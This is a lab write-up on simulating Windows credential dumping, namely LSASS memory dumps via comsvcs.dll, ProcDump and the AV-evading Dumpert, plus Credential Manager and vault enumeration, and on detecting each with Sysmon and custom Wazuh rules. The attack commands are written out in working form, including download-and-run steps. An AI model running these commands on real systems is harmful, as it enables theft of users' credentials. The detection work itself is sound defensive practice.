üß† Overview
Credential dumping is a common post-exploitation tactic used by attackers to extract usernames and passwords from memory, registry hives, or credential stores. Tools like Mimikatz, ProcDump, and Dumpert are often used in these attacks.
In this write-up, we demonstrate how to simulate credential dumping attacks and detect them using Sysmon, Wazuh, and custom detection rules mapped to MITRE ATT&CK T1003 / T1003.001.

‚öôÔ∏è Environment Setup
 ** Windows 10 VM (Lab only, never use in production)
 ** Sysmon installed and configured to log:
      ** Event ID 1 ‚Äì Process Creation
      ** Event ID 7 ‚Äì Image Load
      ** Event ID 11 ‚Äì File Creation
      ** Event ID 10 ‚Äì Process Access (used to detect memory access to lsass.exe)
 ** Wazuh Agent installed and connected to the Manager
 ** Wazuh Custom Rules loaded for detecting credential dumping behaviors

üß™ Simulated Credential Dumping Commands
üîπ 1. LSASS Dump via comsvcs.dll (Rundll32)
rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump 624 C:\temp\lsass.dmp full
 ** Behavior: Loads comsvcs.dll to call the MiniDump function on the lsass process
 ** Detection: Custom Wazuh rule checks for:
       ** Rundll32.exe execution
       ** comsvcs.dll image load in the process

üîπ 2. LSASS Dump using Sysinternals ProcDump
Invoke-WebRequest https://download.sysinternals.com/files/Procdump.zip -OutFile procdump.zip
Expand-Archive procdump.zip
cd procdump
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp
** Behavior: Dumps full memory of lsass.exe using Procdump
** Detection: Custom Wazuh rule inspects file creation (lsass.dmp) by any process not named lsass.exe

üîπ 3. LSASS Dump using Dumpert
Invoke-WebRequest https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe -OutFile Outflank-Dumpert.exe
.\Outflank-Dumpert.exe
 ** Behavior: Uses direct system calls to dump LSASS memory to bypass AV
 ** Detection: Same as above ‚Äî triggers file creation and memory access to lsass.exe

üîπ 4. Windows Credential Manager Enumeration
rundll32.exe keymgr.dll,KRShowKeyMgr
 ** Behavior: Opens stored credential dialog
 ** Detection: Rundll32 executed with command line containing keymgr.dll,KRShowKeyMgr

üîπ 5. Vault Credentials Enumeration
vaultcmd /listcreds:"Windows Credentials" /all
 ** Behavior: Enumerates saved credentials in Windows Vault
 ** Detection: Vaultcmd.exe process with "list" in the command line

üìú Wazuh Custom Rules
<group name="Windows,attack,">
  <!-- LSASS Dump via Rundll32 and comsvcs.dll -->
  <rule id="100010" level="10">
    <if_sid>61609</if_sid>
    <field name="win.eventdata.image" type="pcre2">(?i)\\\\rundll32.exe</field>
    <field name="win.eventdata.imageLoaded" type="pcre2">(?i)[c-z]:\\\\Windows\\\\System32\\\\comsvcs\.dll</field>
    <description>Possible adversary activity - LSASS memory dump via comsvcs.dll on $(win.system.computer).</description>
    <mitre><id>T1003.001</id></mitre>
  </rule>

  <!-- LSASS Dump via file creation -->
  <rule id="100011" level="10">
    <if_sid>61613</if_sid>
    <field name="win.eventData.targetFilename" type="pcre2">(?i)\\\\[^\\]*\.dmp$</field>
    <field name="win.eventData.image" negate="yes" type="pcre2">(?i)\\\\lsass.*</field>
    <description>Possible adversary activity - LSASS memory dump file creation by $(win.eventdata.image).</description>
    <mitre><id>T1003.001</id></mitre>
  </rule>

  <!-- Credential Manager Access -->
  <rule id="100012" level="10">
    <if_sid>61603</if_sid>
    <field name="win.eventData.Image" type="pcre2">(?i)\\\\rundll32.exe</field>
    <field name="win.eventData.commandLine" type="pcre2">keymgr.dll,KRShowKeyMgr</field>
    <description>Credential Manager Access via rundll32 on $(win.system.computer).</description>
    <mitre><id>T1003</id></mitre>
  </rule>

  <!-- Vaultcmd enumeration -->
  <rule id="100013" level="10">
    <if_sid>92052</if_sid>
    <field name="win.eventData.image" type="pcre2">(?i)\\\\vaultcmd.exe</field>
    <field name="win.eventData.commandLine" type="pcre2">list</field>
    <description>Vault credential listing via vaultcmd.exe on $(win.system.computer).</description>
    <mitre><id>T1003</id></mitre>
  </rule>
</group>

‚úÖ Conclusion
This simulation covers real-world credential dumping techniques and shows how Wazuh, with the right rules and Sysmon configuration, can detect these threats effectively. Each attack technique was mapped to a MITRE ATT&CK ID (T1003 / T1003.001), allowing correlation with broader attack chains.
